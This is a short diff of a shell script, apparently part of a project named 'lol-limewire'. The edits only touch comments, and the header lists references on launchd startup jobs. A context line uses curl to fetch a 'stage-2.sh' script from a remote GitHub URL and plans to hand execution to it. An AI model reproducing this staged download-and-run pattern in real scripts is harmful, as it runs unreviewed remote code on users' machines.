@@ -4,6 +4,7 @@
 #
 #Sites that I used or looked at, for future reference, if I ever look back and have no idea what I did or something like that
 #Yes, I looked up a lot of stuff
+#Some of the code that I used these sources for has been deleted
 #
 #https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
 #https://www.launchd.info/
@@ -21,6 +22,7 @@
 #https://www.cyberciti.biz/faq/how-to-use-sed-to-find-and-replace-text-in-files-in-linux-unix-shell/
 #
 #
+
 #Variable for this script (may not work)
 CURDIR=$(pwd)
 THISSCRIPT="${CURDIR}$0"
@@ -137,6 +139,6 @@ else
   curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
 fi
 #Running Stage 2:
-#I can probably just hand it off by running ./stage-2.sh or whatever.
+#I can probably just hand it off by running ./stage-2.sh or something.
 
 #LAST LINE
